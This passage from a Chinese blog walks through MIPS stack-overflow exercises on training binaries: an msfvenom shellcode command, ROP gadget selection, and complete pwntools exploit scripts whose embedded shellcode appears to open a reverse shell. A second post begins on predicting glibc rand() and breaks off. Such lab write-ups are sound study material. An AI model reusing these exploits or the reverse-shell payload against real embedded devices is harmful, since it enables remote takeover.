src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171406868.png" alt="image.png"></a><br>主要的一个漏洞仍然是通过strcpy引发的栈溢出 但是该程序没有提供后门函数 并且在描述中提到需要使用shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v4; // [sp+18h] [+18h] BYREF</span><br><span class="line">  char v5[498]; // [sp+1Ah] [+1Ah] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  memset(v5, 0, sizeof(v5));</span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Welcome to the Second BoF exercise! You&#x27;ll need Shellcode for this! ;)\r\n\r&quot;);</span><br><span class="line">  strcpy((char *)&amp;v4, argv[1]);</span><br><span class="line">  printf(&quot;You entered %s \r\n&quot;, (const char *)&amp;v4);</span><br><span class="line">  puts(&quot;Try Again\r&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有开启任何保护<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171408877.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404171408877.png" alt="image.png"></a><br>那么还是老办法 想办法得到垃圾数据的长度 接着往栈上写入shellcode 随后劫持$ra寄存器跳转至shellcode<br>这里介绍一个工具msfvenom 用其来生成我们所需要的shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo snap install metasploit-framework 安装</span><br></pre></td></tr></table></figure><p>这里指定一下要生成的类型 执行&#x2F;bin&#x2F;sh的系统调用 mipsel架构 linux平台 去除\x00字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/exec  CMD=/bin/sh  --arch mipsle --platform linux -f py --bad-chars &quot;\x00&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404172109163.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404172109163.png" alt="image.png"></a><br>在查询了其他师傅的博客后 发现都提到了一点 即可以利用nop sled来增加shellcode的泛用性<br>大概的原理就是通过大量的nop指令堆在shellcode前面 这样程序执行流不管落在哪里都可以往下执行 和做x86题目用到的思路是一样的<br>不过这里由于我关闭了aslr 所以栈的地址是固定的 就用不上了<br>使用pwntools自带的shellcraft也可以生成shellcode<br>顺带一提 如果使用stack_bof_01的exp脚本那种形式 不知道为什么同样的shellcode无法打通<br>所以这里更换了一下exp 将payload写到文件中 再将文件的内容作为stack_bof_01的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_addr = 0x407ffbe8</span><br><span class="line">payload = shellcode.ljust(0x1fc,b&#x27;a&#x27;)+p32(stack_addr)</span><br><span class="line"></span><br><span class="line">with open(&quot;payload&quot;,&quot;wb+&quot;) as f:</span><br><span class="line"> f.write(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#io = process(b&quot;./qemu-mipsel-static -L .  -g 1111 ./pwnable/ShellCode_Required/stack_bof_02 &quot;+payload,shell=True)</span><br><span class="line"></span><br><span class="line">#elf = ELF(&quot;./pwnable/ShellCode_Required/stack_bof_02&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel-static -L .  ./pwnable/ShellCode_Required/stack_bof_02 &quot;$(cat payload)&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281019473.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281019473.png" alt="image.png"></a></p><h1 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281022879.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281022879.png" alt="image.png"></a><br>32位小端序mips架构<br>保护全关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281058933.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202404281058933.png" alt="image.png"></a><br>接着来分析一下程序的主体逻辑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  uint16_t v3; // $v0</span><br><span class="line">  int v4; // $v0</span><br><span class="line">  int v5; // $v0</span><br><span class="line">  size_t v6; // $v0</span><br><span class="line">  int v8; // [sp+24h] [+24h]</span><br><span class="line">  int fd; // [sp+28h] [+28h]</span><br><span class="line">  __int16 v10; // [sp+2Ch] [+2Ch] BYREF</span><br><span class="line">  char v11[498]; // [sp+2Eh] [+2Eh] BYREF</span><br><span class="line">  __int16 v12; // [sp+220h] [+220h] BYREF</span><br><span class="line">  char v13[48]; // [sp+222h] [+222h] BYREF</span><br><span class="line">  int v14; // [sp+254h] [+254h] BYREF</span><br><span class="line">  struct sockaddr v15; // [sp+258h] [+258h] BYREF</span><br><span class="line"></span><br><span class="line">  if ( argc &lt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Usage: %s port_number - by b1ack0wl\n&quot;, *argv);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  memset(v11, 0, sizeof(v11));</span><br><span class="line">  v12 = 0;</span><br><span class="line">  memset(v13, 0, sizeof(v13));</span><br><span class="line">  v14 = 1;</span><br><span class="line">  fd = socket(2, 2, 0);</span><br><span class="line">  bzero(&amp;v15, 0x10u);</span><br><span class="line">  v15.sa_family = 2;</span><br><span class="line">  *&amp;v15.sa_data[2] = htons(0);</span><br><span class="line">  v3 = atoi(argv[1]);</span><br><span class="line">  *v15.sa_data = htons(v3);</span><br><span class="line">  v4 = atoi(argv[1]);</span><br><span class="line">  printf(&quot;Binding to port %i\n&quot;, v4);</span><br><span class="line">  if ( bind(fd, &amp;v15, 0x10u) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = atoi(argv[1]);</span><br><span class="line">    printf(&quot;Error Binding to port %i\n&quot;, v5);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( setsockopt(fd, 0xFFFF, 4, &amp;v14, 4u) &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Setsockopt failed :(&quot;);</span><br><span class="line">    close(fd);</span><br><span class="line">    exit(2);</span><br><span class="line">  &#125;</span><br><span class="line">  listen(fd, 2);</span><br><span class="line">  v8 = accept(fd, 0, 0);</span><br><span class="line">  bzero(&amp;v10, 0x1F4u);</span><br><span class="line">  write(v8, &quot;Send Me Bytes:&quot;, 0xEu);</span><br><span class="line">  read(v8, &amp;v10, 0x1F4u);</span><br><span class="line">  sprintf(&amp;v12, &quot;nom nom nom, you sent me %s&quot;, &amp;v10);</span><br><span class="line">  printf(&quot;Sent back - %s&quot;, &amp;v10);</span><br><span class="line">  v6 = strlen(&amp;v12);</span><br><span class="line">  write(v8, &amp;v12, v6 + 1);</span><br><span class="line">  shutdown(v8, 2);</span><br><span class="line">  shutdown(fd, 2);</span><br><span class="line">  close(v8);</span><br><span class="line">  close(fd);</span><br><span class="line">  return 66;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仍然对于argc进行了限制 需要我们提供程序参数<br>接着建立了一个socket通信 使用AF_INET协议族 即ipv4 套接字类型为数据报套接字 传输协议默认使用ip<br>随后使用bzero清空了v15数组 该数组用于存储socket信息<br>我们输入的参数赋值于sa_data成员 同时经过了htons函数 由小端序变为大端序<br>这里充当的是端口 随后利用bind函数和指定的端口相连<br>接着调用listen函数等待指定的端口出现客户端连接 这里的程序充当服务端<br>accept函数用于接受客户端的请求<br>接受到的数据存放于v10数组<br>漏洞出现在sprintf函数中 可以造成栈溢出<br>显然 这里的攻击思路就是劫持程序执行流 使其跳转到我们写入的shellcode</p><p>首先还是要获取偏移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel-static -L . -g 1234 ./pwnable/ShellCode_Required/socket_bof 9999</span><br></pre></td></tr></table></figure><p>先启动程序 程序的端口为1234 监听的端口为9999<br>随后gdb连接1234 断点打在read函数 调用exp脚本发送垃圾数据 断点打在赋值ra寄存器那边 得到偏移为0x33</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">io = remote(&quot;127.0.0.1&quot;,9999)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Send Me Bytes:&quot;)</span><br><span class="line">io.sendline(cyclic(0x300))</span><br></pre></td></tr></table></figure><p>按照原本的想法 直接打shellcode就行了 但是最后无法实现  查阅了其他师傅的博客<br>问题出在mips架构的缓存不一致性 这一概念该如何理解<br>对于cpu的cache缓存一定不陌生 L1 cache为了处理指令和数据 指令是只读 而数据是读写  为了提高读写效率 将其分为了两个cache I-cache(指令缓存) D-cache(数据缓存)<br>所以这里需要将我们写入的shellcode从D-cache刷新到I-cache<br>理解到这里 产生了一个疑问 为什么在stack_bof_02中 我们写入的shellcode不需要考虑到该问题 即可生效<br>对比二者的程序逻辑 最明显的不同在于stack_bof_02从指令行中读取参数 socket_bof利用socket来获取数据<br>猜测通过socket传输的数据存储在了D-cache中<br>那么如何把数据从D-cache刷新到I-cache 利用sleep函数<br>给予一定的时间 来让D-cache和I-cache二者同步<br>所以接下来的目标就是寻找gadget 执行sleep(1)后跳转到shellcode<br>这里学习使用一个新的工具 ida的插件mipsrop<br>具体的安装和使用自行搜索教程 这里提一个我遇到的报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121452160.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121452160.png" alt="image.png"></a><br>在edit中plugins的MIPS ROP Finder可以正常运行 但是在执行mipsrop.find(“li $a0,1”)时报错<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121455132.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121455132.png" alt="image.png"></a><br>参照该教程 成功解决问题<a href="https://blog.csdn.net/snowleopard_bin/article/details/115376333">https://blog.csdn.net/snowleopard_bin/article/details/115376333</a><br>执行mipsrop.find(“li $a0,1”)用来控制$a0寄存器 作为sleep函数的参数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121511063.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121511063.png" alt="image.png"></a><br>这里选用0x00018AA8这一条gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121517986.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405121517986.png" alt="image.png"></a><br>执行完li $a0,1后 跳转的地址依赖于$s3寄存器<br>接下来需要获取控制$s3寄存器的gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405181537847.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405181537847.png" alt="image.png"></a><br>有很多条  这里选用0x7730处的gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405190954232.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405190954232.png" alt="image.png"></a><br>在我们执行完sleep函数后 还需要跳转到shellcode处执行 那么这里就需要错开寄存器<br>使用$s2或者$s1寄存器来跳转<br>可以使用mipsrop.tail()函数 该函数可以查询所有函数尾部调用的gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191016154.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191016154.png" alt="image.png"></a><br>选择0x20F1C的gadget 通过$s2来执行shellcode<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191025964.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405191025964.png" alt="image.png"></a><br>那么总结一下gadget的执行顺序  首先执行0x7730的gadget 控制$s3为sleep函数的地址 $s2为0x00018AA8这条gadget的地址<br>再控制$ra为0x20F1C的gadget 这条gadget控制$ra为shellcode的地址<br>编写如下poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">io = remote(&quot;127.0.0.1&quot;,7777)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Send Me Bytes:&quot;)</span><br><span class="line"></span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&quot;</span><br><span class="line">buf += b&quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&quot;</span><br><span class="line">buf += b&quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&quot;</span><br><span class="line">buf += b&quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&quot;</span><br><span class="line">buf += b&quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&quot;</span><br><span class="line">buf += b&quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&quot;</span><br><span class="line">buf += b&quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_addr = 0x408000a0</span><br><span class="line">libc_addr = 0x3fee5000</span><br><span class="line">gadget1 = libc_addr + 0x7730</span><br><span class="line">gadget2 = libc_addr + 0x00018AA8</span><br><span class="line">gadget3 = libc_addr + 0x20F1C</span><br><span class="line">sleep_addr = libc_addr + 0x2F2B0</span><br><span class="line">payload = cyclic(0x33)+p32(gadget1)</span><br><span class="line">payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)</span><br><span class="line">payload += cyclic(0x24)+p32(gadget2)+p32(shellcode_addr)+buf</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>执行发现程序卡在sleep函数执行中的这里<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201758720.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201758720.png" alt="image.png"></a><br>问题出在$s2寄存器上<br>本句汇编的作用为 将$s0的值赋值给$s2+0x64处的地址<br>而此时对应的地址权限为不可写<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201913820.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201913820.png" alt="image.png"></a><br>同时 在libc文件中定位到一段gadget<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201919095.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405201919095.png" alt="image.png"></a><br>这里对于$s2寄存器减去了大概0x4000多字节 所以我们要做的就是在执行gadget2的时候 把$s2寄存器替换为一个可读地址加上0x4000字节<br>更改后的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = cyclic(0x33)+p32(gadget1)</span><br><span class="line">payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)</span><br><span class="line">payload += cyclic(0x24)+p32(shellcode_addr+0x4000)+cyclic(0x4)+p32(shellcode_addr)+buf</span><br></pre></td></tr></table></figure><p>此时已经可以成功执行sleep函数 但是新的问题出现了 没有按照预期的执行完sleep函数后根据$ra寄存器中的shellcode地址进行跳转 分析了sleep函数的汇编后<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202047200.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202047200.png" alt="image.png"></a><br>发现问题出在sleep函数在结束的时候 还会对$ra寄存器重新赋值<br>所以需要根据偏移重新布置栈<br>这里解释一下为什么我的shellcode前面要有那么多额外的偏移 这是因为我shellcode如果不增加偏移的话 地址为0x408000a4 这其中有\x00字节  会导致后面的字节都无法传输 所以将其更改为\x01<br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from systemd import*</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;mips&#x27;,endian=&#x27;little&#x27;,bits=32)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">io = remote(&quot;127.0.0.1&quot;,2222)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Send Me Bytes:&quot;)</span><br><span class="line"></span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&quot;</span><br><span class="line">buf += b&quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&quot;</span><br><span class="line">buf += b&quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&quot;</span><br><span class="line">buf += b&quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&quot;</span><br><span class="line">buf += b&quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&quot;</span><br><span class="line">buf += b&quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&quot;</span><br><span class="line">buf += b&quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&quot;</span><br><span class="line">buf += b&quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span><br><span class="line">buf += b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&quot;</span><br><span class="line">buf += b&quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&quot;</span><br><span class="line">buf += b&quot;\x0c\x01\x01\x01&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_addr = 0x408001a4</span><br><span class="line">libc_addr = 0x3fee5000</span><br><span class="line">gadget1 = libc_addr + 0x7730</span><br><span class="line">gadget2 = libc_addr + 0x00018AA8</span><br><span class="line">gadget3 = libc_addr + 0x20F1C</span><br><span class="line">sleep_addr = libc_addr + 0x2F2B0</span><br><span class="line">payload = cyclic(0x33)+p32(gadget1)</span><br><span class="line">payload += cyclic(0x20)+p32(gadget2)+p32(sleep_addr)+p32(gadget3)</span><br><span class="line">payload += cyclic(0x24)+p32(shellcode_addr+0x4000)+p32(shellcode_addr)+cyclic(0x30)+p32(shellcode_addr)+cyclic(0x100-0x30)+buf</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202049562.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202405202049562.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>伪随机数推算</title>
    <link href="http://example.com/2023/10/30/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8E%A8%E7%AE%97/"/>
    <id>http://example.com/2023/10/30/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8E%A8%E7%AE%97/</id>
    <published>2023-10-30T12:42:05.000Z</published>
    <updated>2023-11-04T02:09:44.907Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以往遇到的考察伪随机数的题目都相对比较简单 无非就是通过seed来推算出后续的随机数 但是这次的核心在于 seed不可控且不可知的情况下 如何通过seed生成的伪随机数 来推算出后续的随机数</p><h1 id="rand函数源码分析"><a href="#rand函数源码分析" class="headerlink" title="rand函数源码分析"></a>rand函数源码分析</h1><p>先来弄懂 rand函数究竟是如何通过seed来生成随机数的<br>以下代码均从 <a href="https://codebrowser.dev/glibc/">https://codebrowser.dev/glibc/</a> 摘录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Return a random integer between 0 and RAND_MAX.  */</span><br><span class="line">int</span><br><span class="line">rand (void)</span><br><span class="line">&#123;</span><br><span class="line">  return (int) __random ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部进而调用了__random函数 跟进一下看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__random (void)</span><br><span class="line">&#123;</span><br><span class="line">  int32_t retval;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  (void) __random_r (buf: &amp;unsafe_state, result: &amp;retval);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  return retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注一下__random_r函数 unsafe_state结构体作为参数传输 返回值存储于retval</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static struct random_data unsafe_state =</span><br><span class="line">&#123;</span><br><span class="line">    /* FPTR和RPTR是指向状态信息的两个指针，一个前指针和一个后指针。</span><br><span class="line">       这两个指针始终相隔rand_sep个位置，因为它们在状态信息中循环。</span><br><span class="line">       （是的，这意味着我们可以只用一个指针，但是这种方式的random代码更高效）。</span><br><span class="line">       这两个指针的位置是从调用initstate(1, randtbl, 128)的位置开始：</span><br><span class="line">       （后指针rptr的位置实际上是0（如上面在初始化randtbl时解释的那样），</span><br><span class="line">       因为状态表指针被设置为指向randtbl[1]（如下面解释的那样）。）*/</span><br><span class="line"></span><br><span class="line">    .fptr = &amp;randtbl[SEP_3 + 1],    // SEP_3 = 3</span><br><span class="line">    .rptr = &amp;randtbl[1],</span><br><span class="line"></span><br><span class="line">    /* 以下内容是指向状态信息表的指针、当前生成器的类型、当前多项式的度数和两个指针之间的间隔。</span><br><span class="line">       注意，为了random的效率，我们记住状态信息的第一个位置，而不是第零个位置。</span><br><span class="line">       因此，访问state[-1]是有效的，它用于存储R.N.G.的类型。</span><br><span class="line">       另外，我们记住最后一个位置，因为这比每次索引以查找最后一个元素的地址来判断前后指针是否已经回绕更高效。 */</span><br><span class="line"></span><br><span class="line">    .state = &amp;randtbl[1],</span><br><span class="line"></span><br><span class="line">    .rand_type = TYPE_3,    // 3</span><br><span class="line">    .rand_deg = DEG_3,      // 3</span><br><span class="line">    .rand_sep = SEP_3,      // 3</span><br><span class="line"></span><br><span class="line">    .end_ptr = &amp;randtbl[sizeof(randtbl) / sizeof(randtbl[0])]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据注释可以得到 fptr和rptr是指向状态信息的前后指针 并且虽然rptr的起始是randtbl[1]但是实际上是0<br>为了理解这一描述 我们先来看一下randtbl数组的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static int32_t randtbl[DEG_3 + 1] =</span><br><span class="line">&#123;</span><br><span class="line">    TYPE_3,</span><br><span class="line"></span><br><span class="line">    -1726662223, 379960547, 1735697613, 1040273694, 1313901226,</span><br><span class="line">    1627687941, -179304937, -2073333483, 1780058412, -1989503057,</span><br><span class="line">    -615974602, 344556628, 939512070, -1249116260, 1507946756,</span><br><span class="line">    -812545463, 154635395, 1388815473, -1926676823, 525320961,</span><br><span class="line">    -1009028674, 968117788, -123449607, 1284210865, 435012392,</span><br><span class="line">    -2017506339, -911064859, -370259173, 1132637927, 1398500161,</span><br><span class="line">    -205601318</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该数组存储着内部状态信息 用于随机数的生成<br>通过randtbl数组的注释 我们可以得知上文中 后指针的位置为0的原因</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Initially, everything is set up as if from: ↪</span><br><span class="line">    initstate(1, randtbl, 128); ↪</span><br><span class="line">   Note that this initialization takes advantage of the fact that srandom ↪</span><br><span class="line">   advances the front and rear pointers 10*rand_deg times, and hence the ↪</span><br><span class="line">   rear pointer which starts at 0 will also end up at zero; thus the zeroth ↪</span><br><span class="line">   element of the state information, which contains info about the current ↪</span><br><span class="line">   position of the rear pointer is just ↪</span><br><span class="line">    (MAX_TYPES * (rptr - state)) + TYPE_3 == TYPE_3.</span><br></pre></td></tr></table></figure><p>后指针在初始化的时候指向第一个元素 所以第一个元素存储的是后指针当前位置的信息<br>接着我们回到unsafe_state结构体<br>其还定义了其他成员 用来记录生成器类型 随机次数 随机间隔<br>此外还记录了最后一个元素的位置<br>接下来分析一下__random_r函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __random_r(struct random_data *buf, int32_t *result)</span><br><span class="line">&#123;</span><br><span class="line">    int32_t *state;</span><br><span class="line"></span><br><span class="line">    if (buf == NULL || result == NULL)</span><br><span class="line">        goto fail;</span><br><span class="line"></span><br><span class="line">    state = buf-&gt;state;</span><br><span class="line"></span><br><span class="line">    if (buf-&gt;rand_type == TYPE_0)</span><br><span class="line">    &#123;</span><br><span class="line">        int32_t val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff;</span><br><span class="line">        state[0] = val;</span><br><span class="line">        *result = val;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        int32_t *fptr = buf-&gt;fptr;</span><br><span class="line">        int32_t *rptr = buf-&gt;rptr;</span><br><span class="line">        int32_t 